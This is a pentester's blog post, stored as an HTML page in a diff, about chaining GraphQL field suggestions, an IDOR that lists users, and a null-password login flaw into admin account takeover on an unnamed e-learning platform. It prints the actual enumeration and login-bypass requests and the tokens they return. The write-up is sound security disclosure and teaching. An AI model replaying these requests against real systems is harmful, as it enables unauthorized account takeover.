@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <link rel="stylesheet" href="/assets/css/main.css">
+
+        <h1 class="post-headline">Oussama Rahali</h1>
+        <h3 class="post-description">Offensive Security Engineer | AppSec</h3>
+
+        <div class="links scroll">
+        <a href="/">Home</a>
+        <a href="/blog/">Blog & Research</a>
+</div>
+
+
+        <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover | Oussama Rahali</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In the world of application security, even low severity misconfigurations can act as a butterfly’s wing flap, triggering a chain reaction that leads to more impactful attack scenarios. Today, I’ll take you on a journey through one such scenario, where low impact vulnerabilities snowball into a full blown zero click account takeover. Along the way, you’ll see how every overlooked detail and misconfiguration can become a stepping stone for a determined attacker." />
+<meta property="og:description" content="In the world of application security, even low severity misconfigurations can act as a butterfly’s wing flap, triggering a chain reaction that leads to more impactful attack scenarios. Today, I’ll take you on a journey through one such scenario, where low impact vulnerabilities snowball into a full blown zero click account takeover. Along the way, you’ll see how every overlooked detail and misconfiguration can become a stepping stone for a determined attacker." />
+<link rel="canonical" href="/blog/butterfly-effect-zero-click-account-takeover/" />
+<meta property="og:url" content="/blog/butterfly-effect-zero-click-account-takeover/" />
+<meta property="og:site_name" content="Oussama Rahali" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-08-07T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover" />
+<meta name="twitter:site" content="@" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-08-07T00:00:00+00:00","datePublished":"2024-08-07T00:00:00+00:00","description":"In the world of application security, even low severity misconfigurations can act as a butterfly’s wing flap, triggering a chain reaction that leads to more impactful attack scenarios. Today, I’ll take you on a journey through one such scenario, where low impact vulnerabilities snowball into a full blown zero click account takeover. Along the way, you’ll see how every overlooked detail and misconfiguration can become a stepping stone for a determined attacker.","headline":"The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover","mainEntityOfPage":{"@type":"WebPage","@id":"/blog/butterfly-effect-zero-click-account-takeover/"},"url":"/blog/butterfly-effect-zero-click-account-takeover/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+        <!-- Generated using https://favicon.io/ -->
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png?">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png?">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png?">
+<link rel="manifest" href=site.webmanifest">
+
+
+        <!-- MathJax -->
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
+  </script>
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: { inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+     processEscapes: true
+    }
+  });
+</script>
+
+
+        <!-- Load fontawesome here for faster loadtimes: https://stackoverflow.com/a/35880730/9523246 -->
+        <script type="text/javascript"> (function() { var css = document.createElement('link'); css.href = 'https://use.fontawesome.com/releases/v5.11.0/css/all.css'; css.rel = 'stylesheet'; css.type = 'text/css'; document.getElementsByTagName('head')[0].appendChild(css); })(); </script>
+    </head>
+
+    <body>
+        <main>
+            <article>
+                <h1 class="post-headline">The Butterfly Effect: Turning Overlooked Misconfigurations into Zero Click Account Takeover</h1>
+<p class="meta"><small>August 07, 2024</small></p>
+
+<p><img src="../../assets/images/butterfly-hacker.png" alt="butterfly" width="230" height="230" style="float: left; margin-right: 17px;"></p>
+
+<p>In the world of application security, even low severity misconfigurations can act as a butterfly’s wing flap, triggering a chain reaction that leads to more impactful attack scenarios. Today, I’ll take you on a journey through one such scenario, where low impact vulnerabilities snowball into a full blown zero click account takeover. Along the way, you’ll see how every overlooked detail and misconfiguration can become a stepping stone for a determined attacker.
+<!--more--></p>
+
+<p>In a recent pentest, I was tasked with assessing a student e-learning platform. The client uses this platform to train new partners and internal employees. This test was part of the migration process from an external hosting provider to a new managed cloud environment. The client mentioned that the app was developed in-house, so I expected to find several vulnerabilities (which was the case 😛! and I finished the assessment with an RCE 💥 ). Developers often overlook low-priority or seemingly insignificant issues and misconfigurations.</p>
+
+<h2 id="attack-scenario">Attack Scenario</h2>
+
+<h3 id="understanding-the-environment"><strong>Understanding the environment</strong></h3>
+
+<p>While mapping the application, I discovered that it used the GraphQL API. GraphQL is a query language for APIs that allows clients to request exactly the data they need, making it both efficient and flexible. However, misconfigurations and improper implementations can introduce significant security risks.</p>
+
+<h3 id="initial-discovery-graphql-suggestions"><strong>Initial Discovery: GraphQL suggestions</strong></h3>
+
+<p>Our story begins with a benign-looking GraphQL API misconfiguration. At first glance, it offers nothing more than an opportunity to see GraphQL suggestions. This provided valuable insights into the available queries and mutations. Keep this in mind as it plays a crucial role in our later exploitation.</p>
+
+<blockquote>
+  <p><em><strong>GraphQL suggestions</strong> feature provides hints about possible fields or queries you can use. While helpful for developers, leaving this feature enabled in production environments can leak information about available operations and data structures, aiding attackers in crafting more effective attacks.</em></p>
+
+</blockquote>
+
+<h3 id="idor-allowing-enumeration-of-users"><strong>IDOR Allowing Enumeration of Users</strong></h3>
+
+<p>After the initial reconnaissance, I discovered an Insecure Direct Object Reference (IDOR) vulnerability, which allowed me to enumerate all students and administrators of the platform via a student session.</p>
+
+<blockquote>
+  <p><em><strong>Insecure Direct Object Reference (IDOR)</strong> is a type of access control vulnerability that occurs when an application provides direct access to objects based on user-supplied input. This can allow attackers to access unauthorized data by manipulating the input.</em></p>
+</blockquote>
+
+<ul>
+  <li>
+    <p><strong>Enumerate Students:</strong></p>
+
+    <ul>
+      <li>Request:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>POST /graphql
+Host: foo.target.com
+Authorization: Bearer <span class="o">[</span>Student JWT]
+Content-Type: application/json
+
+<span class="o">{</span>
+  <span class="s2">"operationName"</span>: <span class="s2">"student"</span>,
+  <span class="s2">"variables"</span>: <span class="o">{}</span>,
+  <span class="s2">"query"</span>: <span class="s2">"query student {</span><span class="se">\n</span><span class="s2">  student(id:1234) {</span><span class="se">\n</span><span class="s2">    firstName</span><span class="se">\n</span><span class="s2">    lastName</span><span class="se">\n</span><span class="s2">    profile</span><span class="se">\n</span><span class="s2">    affiliation</span><span class="se">\n</span><span class="s2">    email</span><span class="se">\n</span><span class="s2">    createdAt</span><span class="se">\n</span><span class="s2">    __typename</span><span class="se">\n</span><span class="s2">  }</span><span class="se">\n</span><span class="s2">}"</span>
+<span class="o">}</span>
+</code></pre></div>    </div>
+    <ul>
+      <li>Response:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+<span class="o">[</span>..]
+
+<span class="o">{</span>
+  <span class="s2">"data"</span>: <span class="o">{</span>
+    <span class="s2">"student"</span>: <span class="o">{</span>
+      <span class="s2">"firstName"</span>: <span class="s2">"Alan"</span>,
+      <span class="s2">"lastName"</span>: <span class="s2">"Turing"</span>,
+      <span class="s2">"profile"</span>: <span class="s2">"Employee"</span>,
+      <span class="s2">"affiliation"</span>: <span class="s2">"foobar"</span>,
+      <span class="s2">"email"</span>: <span class="s2">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="cdaca1aca3e3b9b8bfa4a3aa8dbeb9b8a9a8a3b9e3b9a1a9">[email&#160;protected]</a>"</span>,
+      <span class="s2">"createdAt"</span>: <span class="s2">"2021-05-18T17:58:21.000Z"</span>,
+      <span class="s2">"__typename"</span>: <span class="s2">"Student"</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p><strong>Enumerate Admins:</strong></p>
+
+    <ul>
+      <li>Request:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>POST /graphql
+Host: foo.target.com
+Authorization: Bearer <span class="o">[</span>Student JWT]
+Content-Type: application/json
+
+<span class="o">{</span>
+  <span class="s2">"operationName"</span>: <span class="s2">"Administrator"</span>,
+  <span class="s2">"variables"</span>: <span class="o">{</span>
+    <span class="s2">"id"</span>: <span class="s2">"500"</span>
+  <span class="o">}</span>,
+  <span class="s2">"query"</span>: <span class="s2">"query Administrator(</span><span class="nv">$id</span><span class="s2">: ID!) {</span><span class="se">\n</span><span class="s2">  administrator(id: </span><span class="nv">$id</span><span class="s2">) {</span><span class="se">\n</span><span class="s2">    id</span><span class="se">\n</span><span class="s2">    firstName</span><span class="se">\n</span><span class="s2">    lastName</span><span class="se">\n</span><span class="s2">    email</span><span class="se">\n</span><span class="s2">    adminLevel</span><span class="se">\n</span><span class="s2">    trainerId</span><span class="se">\n</span><span class="s2">    affiliation</span><span class="se">\n</span><span class="s2">    proprietaire</span><span class="se">\n</span><span class="s2">    team</span><span class="se">\n</span><span class="s2">    favoriteCourses</span><span class="se">\n</span><span class="s2">     specificAccessStartDate</span><span class="se">\n</span><span class="s2">    specificAccessEndDate</span><span class="se">\n</span><span class="s2">    __typename</span><span class="se">\n</span><span class="s2">  }</span><span class="se">\n</span><span class="s2">}"</span>
+<span class="o">}</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Response:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+<span class="o">[</span>..]
+
+<span class="o">{</span>
+  <span class="s2">"data"</span>: <span class="o">{</span>
+    <span class="s2">"administrator"</span>: <span class="o">{</span>
+      <span class="s2">"id"</span>: <span class="s2">"500"</span>,
+      <span class="s2">"firstName"</span>: <span class="s2">"Linus"</span>,
+      <span class="s2">"lastName"</span>: <span class="s2">"Torvalds"</span>,
+      <span class="s2">"email"</span>: <span class="s2">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f79b9e998284d983988581969b9384b796939a9e99d9839b93">[email&#160;protected]</a>"</span>,
+      <span class="s2">"adminLevel"</span>: 2,
+      <span class="s2">"trainerId"</span>: <span class="s2">"Linus_Torvalds"</span>,
+      <span class="s2">"affiliation"</span>: <span class="s2">""</span>,
+      <span class="s2">"proprietaire"</span>: null,
+      <span class="s2">"team"</span>: null,
+      <span class="s2">"favoriteCourses"</span>: null,
+      <span class="s2">"specificAccessStartDate"</span>: null,
+      <span class="s2">"specificAccessEndDate"</span>: null,
+      <span class="s2">"__typename"</span>: <span class="s2">"Administrator"</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="how-graphqls-exclamation-point--can-mislead-when-required-fields-arent-what-they-seem"><strong>How GraphQL’s Exclamation point <code class="language-plaintext highlighter-rouge">!</code> Can Mislead: When Required Fields Aren’t What They Seem</strong></h3>
+
+<p>The next breadcrumb in our trail was after analyzing the application’s JavaScript files. Within one of them, I found a mutation for logging in as a student:</p>
+
+<p><img src="../../assets/JS_file_snipped.png" alt="JS snipped"></p>
+
+<p>At first glance, we can see that the email, password and loggedSSO variables include an exclamation point, which means that their <strong>values cannot be null</strong>.</p>
+<blockquote>
+  <p><strong>Nullability in GraphQL:</strong> In GraphQL, fields are nullable by default, meaning they can accept a null value unless explicitly marked otherwise. Developers can use the exclamation point (!) to designate a field as non-nullable, ensuring it must always have a value. However, this approach can be misleading. If developers mishandle nullability or make incorrect assumptions about it, they may inadvertently introduce vulnerabilities into their applications. For instance, an incorrectly handled non-nullable field might still allow a null value to pass through in certain conditions, leading to unexpected behavior or security flaws.</p>
+
+</blockquote>
+
+<p>I tried setting the <code class="language-plaintext highlighter-rouge">loggedSSO</code> argument to <code class="language-plaintext highlighter-rouge">true</code> with one of the student emails and without setting the password. To my surprise, the server returned the access token for that student.</p>
+
+<blockquote>
+  <p><strong>Note:</strong> The application used SSO (Single Sign-On) for authentication. However, based on this finding, I assumed that the developers had implemented a separate function to retrieve the JWT after successfully authenticating via SSO. Yet, the implementation was misconfigured in this case, as the password value can be null (contradictory to the presence of the exclamation mark we had on the JS file earlier), leading to bypassing the password requirement and obtaining access tokens.</p>
+
+</blockquote>
+
+<p>This vulnerability arose from the fact that while the GraphQL schema defined the <code class="language-plaintext highlighter-rouge">password</code> field as non-nullable, the backend logic did not enforce this constraint effectively. The presence of the <code class="language-plaintext highlighter-rouge">loggedSSO</code> flag bypassed the need for a password, leading to a critical authentication bypass.</p>
+
+<p>Using this newfound knowledge, I crafted a request to bypass authentication for a student account.</p>
+
+<ul>
+  <li>Request</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /graphql
+Host: foo.target.tld
+Content-Type: application/json
+
+<span class="o">{</span>
+  <span class="s2">"operationName"</span>: <span class="s2">"LoginStudent"</span>,
+  <span class="s2">"variables"</span>: <span class="o">{</span>
+    <span class="s2">"email"</span>: <span class="s2">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="86e7eae7e8a8f2f3f4efe8e1c6f5f2f3e2e3e8f2a8f2eae2">[email&#160;protected]</a>"</span>,
+    <span class="s2">"password"</span>: <span class="s2">""</span>,
+    <span class="s2">"loggedSSO"</span>: <span class="nb">true</span>
+  <span class="o">}</span>,
+  <span class="s2">"query"</span>: <span class="s2">"mutation LoginStudent(</span><span class="nv">$email</span><span class="s2">: String, </span><span class="nv">$uid</span><span class="s2">: String, </span><span class="nv">$password</span><span class="s2">: String, </span><span class="nv">$loggedSSO</span><span class="s2">: Boolean!, </span><span class="nv">$dataToUpdate</span><span class="s2">: String) {</span><span class="se">\n</span><span class="s2">  loginStudent(</span><span class="se">\n</span><span class="s2">    email: </span><span class="nv">$email</span><span class="se">\n</span><span class="s2">    uid: </span><span class="nv">$uid</span><span class="se">\n</span><span class="s2">    password: </span><span class="nv">$password</span><span class="se">\n</span><span class="s2">    loggedSSO: </span><span class="nv">$loggedSSO</span><span class="se">\n</span><span class="s2">    dataToUpdate: </span><span class="nv">$dataToUpdate</span><span class="se">\n</span><span class="s2">  )</span><span class="se">\n</span><span class="s2">}"</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Response</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+<span class="o">[</span>..]
+
+<span class="o">{</span>
+  <span class="s2">"data"</span>: <span class="o">{</span>
+    <span class="s2">"loginStudent"</span>: <span class="s2">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwiZW1haWwiOiJhbGFuLnR1cmluZ0BzdHVkZW50LnRsZCIsImFmZmlsaWF0aW9uIjoidGFyZ2V0IiwiaWF0IjoxNzIxMjI2OTIwLCJleHAiOjE3MjkwMDI5MjB9.rCRntgXZmuqeaAv_l0w5SvTGiXnpTS62qiboaq-o5sc"</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>With this token, I had control of the student’s account (this vulnerability can be combined with IDOR to increase its impact).</p>
+
+<h3 id="authentication-bypass-admin---leveraging-graphql-suggestions-for-admin-access"><strong>Authentication Bypass: Admin - Leveraging GraphQL Suggestions for Admin Access</strong></h3>
+
+<p>At this stage, we could take over any student accounts using only their email address, which we were able to enumerate via the IDOR vulnerability. I then wondered what would happen if I used an administrator’s e-mail address! The result was that the server returned a session token, but using this token, I was not able to access the administrator’s features.</p>
+
+<blockquote>
+  <p>Further investigation led to understanding that the admin’s session token must contain an additional parameter within the JWT body, which is “adminLevel”. This parameter was also returned by the server when listing the adminstrators (see IDOR section).</p>
+
+</blockquote>
+
+<p>I performed several attempts here, including trying to force this parameter in the request, without success.</p>
+
+<p>And here’s where our initial discovery comes in handy. The breakthrough came from an error message I encountered while experimenting with the GraphQL API. When I tried to change the mutation to LoginAdmin, the GraphQL API suggestions corrected my query with new suggestions (<em>Cannot query field “LoginAdmin” on type “Mutation”. Did you mean “loginAdmin” or “signupAdmin” ?</em>):</p>
+
+<p><img src="../../assets/graphql_suggestions.png" alt="graphql suggestions"></p>
+
+<p>This suggestion revealed the correct mutation <code class="language-plaintext highlighter-rouge">loginAdmin</code> for logging in as an admin.</p>
+
+<p>With the correct mutation in hand, I used the previous mutation to bypass authentication for an admin account. and this time, the JWT returned by the server had the adminlevel parameter within the body of the token.</p>
+
+<ul>
+  <li>Request</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /graphql
+Host: foo.target.tld
+Content-Type: application/json
+
+<span class="o">{</span>
+  <span class="s2">"operationName"</span>: <span class="s2">"loginAdmin"</span>,
+  <span class="s2">"variables"</span>: <span class="o">{</span>
+    <span class="s2">"email"</span>: <span class="s2">"<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d7bbbeb9a2a4f9a3b8a5a1b6bbb3a497b6b3babeb9f9a3bbb3">[email&#160;protected]</a>"</span>,
+    <span class="s2">"password"</span>: <span class="s2">""</span>,
+    <span class="s2">"loggedSSO"</span>: <span class="nb">true</span>
+  <span class="o">}</span>,
+  <span class="s2">"query"</span>: <span class="s2">"mutation loginAdmin(</span><span class="nv">$email</span><span class="s2">: String, </span><span class="nv">$uid</span><span class="s2">: String, </span><span class="nv">$password</span><span class="s2">: String, </span><span class="nv">$loggedSSO</span><span class="s2">: Boolean!, </span><span class="nv">$dataToUpdate</span><span class="s2">: String) {</span><span class="se">\n</span><span class="s2">  loginAdmin(</span><span class="se">\n</span><span class="s2">    email: </span><span class="nv">$email</span><span class="se">\n</span><span class="s2">    uid: </span><span class="nv">$uid</span><span class="se">\n</span><span class="s2">    password: </span><span class="nv">$password</span><span class="se">\n</span><span class="s2">    loggedSSO: </span><span class="nv">$loggedSSO</span><span class="se">\n</span><span class="s2">    dataToUpdate: </span><span class="nv">$dataToUpdate</span><span class="se">\n</span><span class="s2">  )</span><span class="se">\n</span><span class="s2">}"</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Response</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+<span class="o">[</span>..]
+
+<span class="o">{</span>
+  <span class="s2">"data"</span>: <span class="o">{</span>
+    <span class="s2">"loginAdmin"</span>: <span class="s2">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAwLCJlbWFpbCI6ImxpbnVzLnRvcnZhbGRzQGFkbWluLnRsZCIsImFkbWluTGV2ZWwiOjIsImlhdCI6MTcyMTMwMjMyNywiZXhwIjoxNzIzODk0MzI3fQ.xd-9Jf9OlBlWAc-H_DuU-WiK1dEj1UbYwCPnPWiT8Mk"</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>With this token, we now have full control over the admin’s account, completing our journey from low impact vulnerabilities to a zero click account takeover.</p>
+
+<h2 id="the-end-">The End ?</h2>
+
+<p>In application security, no misconfiguration is less impactful to ignore. As demonstrated in this story, even the most insignificant issues such as GraphQL Suggestions or Nullability can be chained together to create a more impactful issue.</p>
+
+<p>As for developers, be cautious about implementing features like GraphQL Suggestions in production, thoroughly understand the nuances of every feature, and pay close attention to details such as the use of exclamation marks (!) in GraphQL schemas.</p>
+
+<p>Pentesters, always question every detail, document every misconfiguration, cross-check your findings, and keep in mind that the butterfly effect is very real.</p>
+
+<p>Thanks for the read &amp; see you in the next story :)</p>
+
+
+<!-- Comments only for posts -->
+
+    
+
+
+            </article>
+        </main>
+
+        <footer>
+          <p class="copy">
+            <small> © Oussama Rahali 2024
+            </small>
+          </p>
+
+        <div class="rounded-social-buttons">
+<a title="" class="social-button email" itemprop="email" href="/cdn-cgi/l/email-protection#a78291e3829192e78291e18290928290948290948291968291e382919682909582919682919f8291968291e482919e898291948291e18291e3" target="_blank">
+<i class="far fa-envelope"></i>
+</a><a title="" class="social-button linkedin" href="https://www.linkedin.com/in/oussamarahali" itemprop="sameAs" target="_blank" rel="noopener noreferrer">
+<i class="fab fa-linkedin"></i>
+</a><a title="" class="social-button github" href="https://www.github.com/v0lck3r" itemprop="sameAs" target="_blank" rel="noopener noreferrer">
+<i class="fab fa-github"></i>
+</a><a title="" class="social-button twitter" href="https://www.twitter.com/ourahali" itemprop="sameAs" target="_blank" rel="noopener noreferrer">
+<i class="fab fa-twitter"></i>
+</a>
+</div>
+
+
+        </footer>
+
+        <!-- Google Analytics Tracking code -->
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ga-lite@1/dist/ga-lite.min.js" async></script>
+<script>
+var galite = galite || {};
+galite.UA = '';
+</script>
+
+    </body>
+
+</html>
